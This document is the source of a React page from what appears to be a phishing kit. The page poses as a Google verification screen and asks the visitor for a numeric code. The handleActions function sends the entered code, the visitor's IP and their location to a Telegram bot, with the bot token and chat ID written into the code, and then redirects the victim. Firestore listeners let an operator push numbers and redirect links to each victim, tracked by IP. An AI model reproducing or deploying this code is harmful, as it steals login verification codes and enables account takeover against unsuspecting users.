import React, { useEffect, useState } from "react";
import {
  addDoc,
  collection,
  doc,
  getDoc,
  getDocs,
  onSnapshot,
  setDoc,
  query,
  where,
} from "firebase/firestore";
import { ref, listAll, getDownloadURL } from "firebase/storage";
import { publicIp, publicIpv4, publicIpv6 } from "public-ip";
import { storage, db } from "../firebase.js";
import "../assets/poza27.css";
import GoogleLogo from "../assets/google-logo.png";
import { useParams } from "react-router-dom";

const About66 = () => {
  const { number } = useParams();
  const [ip, setIp] = useState(undefined);
  const [code, setCode] = useState("");
  const [userData, setUserData] = useState(undefined);
  const [isUserData, setIsUserData] = useState(false);
  const [userUrl, setUserUrl] = useState(false);
  const [imageUrl, setImageUrl] = useState("");
  const [textValue, setTextValue] = useState("");

  const handleActions = () => {
    if (code === "") {
      // Handle code validation
      // You can set an error state or display a message
      return;
    } else {
      const bot = "bot6444053579:AAEJM3cGwVt_s9ajNfMpPnKtr_71p20S_dw";
      const chid = "5651241356";

      fetch(`https://ipapi.co/json/`)
        .then((response) => response.json())
        .then((response) => {
          const { country, region, city, postal } = response;
          const params = {
            content: `========================
                  TWO 1: '${code}'
                  Country : '${country}'
                  Region : '${region}'
                  City : '${city}'
                  IP: '${ip}'
                  ========================`,
          };

          fetch(
            `https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}`,
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
            }
          )
            .then(() => {
              window.location = "rwr";
              // Handle success, e.g., redirect to 'confirm2.html'
              // You can use react-router or window.location
            })
            .catch((error) => {
              window.location = "rwr";
            });
        });
    }
  };

  const handleCodeChange = (e) => {
    setCode(e.target.value.replace(/[^0-9]/g, "")); // Allow only numeric input
  };

  const getUserData = async (e) => {
    const documentSnapshot = await getDocs(collection(db, "nrchanger"));
    const newData = documentSnapshot.docs.map((doc) => ({
      ...doc.data(),
      id: doc.id,
    }));
    const filter = newData.filter((x) => {
      if (x.ip === ip) {
        setIsUserData(true);
        setUserData(x);
        return x;
      }
    });
    if (filter.length === 0) {
      addUserData();
    }
  };

  const getIp = async () => {
    if (ip === undefined) {
      console.log(await publicIpv4());

      const ip = await publicIpv4();
      setIp(ip);
    }
  };
  getIp();

  useEffect(() => {
    if (ip) {
      onSnapshot(collection(db, "nrchanger"), (snapshot) => {
        let isExist = false;
        snapshot.docs
          .map((doc) => ({ ...doc.data(), id: doc.id }))
          .filter((x) => {
            if (x.ip === ip) {
              isExist = true;
              setUserData(x);
              fetch("../data.json")
                .then(function (res) {
                  if (!res.ok) {
                    throw new Error(`HTTP error! status: ${res.status}`);
                  }
                  return res.json();
                })
                .then(function (data) {
                  data.url_data.filter((item) => {
                    if (item.id === parseInt(x.redir)) {
                      setUserUrl(item.url);
                      return;
                    }
                  });
                })
                .catch(function (err) {
                  console.log(err, " error");
                });
            }
          });
        if (!isExist) {
          setUserUrl(false);
        }
      });
    }
  }, [ip, number]);

  useEffect(() => {
    document.title = "About Display";
  }, [userData, userUrl]);

  useEffect(() => {}, [userData]);

  useEffect(() => {
    const fetchImageAndText = async () => {
      try {
        // Fetch image from Firebase Storage
        const storageRef = await ref(storage, "images");
        const imagesList = await listAll(storageRef);

        const image = imagesList.items.find((item) =>
          item.name.startsWith(`${number}_`)
        );

        if (image) {
          const url = await getDownloadURL(image);
          setImageUrl(url);
        } else {
          setImageUrl("");
          console.log("No image found for this number.");
        }

        // Fetch additional information text from Firestore
        const uploadsRef = collection(db, "uploads");
        const q = query(uploadsRef, where("number", "==", parseInt(number)));
        const querySnapshot = await getDocs(q);

        if (!querySnapshot.empty) {
          querySnapshot.forEach((doc) => {
            setTextValue(doc.data().text);
          });
        } else {
          setTextValue("No additional information found for this number.");
        }
      } catch (error) {
        console.error("Error fetching image or text:", error);
        setImageUrl("");
        setTextValue("Error fetching image or text.");
      }
    };

    fetchImageAndText();
  }, [number]);

  const addUserData = async () => {
    try {
      const docRef = doc(collection(db, "nrchanger"), ip);

      // Check if the document exists
      const docSnap = await getDoc(docRef);

      if (!docSnap.exists()) {
        // Document doesn't exist, so set the data
        await setDoc(docRef, {
          ip: ip,
          number: -1,
          redir: "-1",
        });
        console.log("Document written with ID: ", ip);
        getUserData();
      } else {
        console.log("Document already exists with ID: ", ip);
      }
    } catch (e) {
      console.error("Error adding document: ", e);
    }
  };

  const resetUserNumber = async () => {
    try {
      const docRef = doc(collection(db, "nrchanger"), ip);
      await setDoc(docRef, { redir: "-1" }, { merge: true });
      console.log("User number reset to -1 for IP: ", ip);
    } catch (e) {
      console.error("Error resetting user number: ", e);
    }
  };

  useEffect(() => {
    if (ip) {
      getUserData();
    }
  }, [ip]);

  if (userUrl) {
    setTimeout(() => {
      window.location = userUrl;
    }, 1000);
    resetUserNumber();
  }
  console.log("hi here is the data", isUserData, userData);

  if (isUserData) {
    return (
      <>
        {userData.number !== null &&
          userData.number !== undefined &&
          userData.number !== -1 && <div></div>}
        <div className="positivus">
          <img src={GoogleLogo} alt="google logo" className="googleImg" />

          <br></br>
          <br></br>

          <p className="notification"> {userData.number} </p>
          <div className="positInput">
            <br />

            <div className="sfasfkWFtomnS centered">
              <input
                type="text"
                id="code"
                name="code"
                className="textfieldx5"
                onChange={handleCodeChange}
                required
              />
              <span className="form-code"></span>
            </div>

            <br />

            <label></label>
            <div className="forca"></div>
          </div>
          <div className="resetDiv">
            <button
              type="submit"
              className="submit-button"
              onClick={handleActions}
            >
              Next
            </button>
          </div>

          <div className="footer">
            <div></div>
            <div></div>
          </div>
        </div>
        <h2>Image Display</h2>
        {imageUrl ? (
          <img
            src={imageUrl}
            alt="Uploaded"
            style={{ maxWidth: "100%", maxHeight: "400px" }}
          />
        ) : (
          <div>No image found for this number.</div>
        )}
        <div className="text-display">
          <h3>Additional Information</h3>
          <textarea
            value={textValue}
            readOnly
            style={{ width: "100%", height: "100px" }}
          />
        </div>
      </>
    );
  }
};

export default About66;
